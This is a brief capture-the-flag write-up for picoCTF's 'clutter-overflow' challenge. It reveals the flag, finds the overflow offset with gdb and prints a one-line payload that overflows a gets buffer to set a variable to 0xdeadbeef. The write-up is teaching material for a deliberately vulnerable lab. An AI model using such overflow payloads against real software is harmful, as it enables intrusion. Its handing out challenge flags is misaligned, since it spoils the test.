# clutter-overflow

(flag: picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}) <br/>
This one was difficult as well, especially with implementing the buffer exploition of `gets` in the source file `chall.c`.
We see that the local variable `code` is stored in `$rbp - 0x8`. We must use a string longer than 256 bytes (0x100), which is the length of the buffer shown in the source code. 
```
(gdb)  pattern offset $rbp
Searching for '$rbp'
Found at offset 272 (little-endian search) likely
```
We need 272 bytes to control `$rbp`. Thus, we need 264 (272 - 8) to reach the variable. After the 264 characters, we must put `0xdeadbeef` in little-endian format to pass the check:
```
(python3 -c 'import sys; sys.stdout.write("A" * 264)'; echo -e '\xef\xbe\xad\xde') | ./chall
```
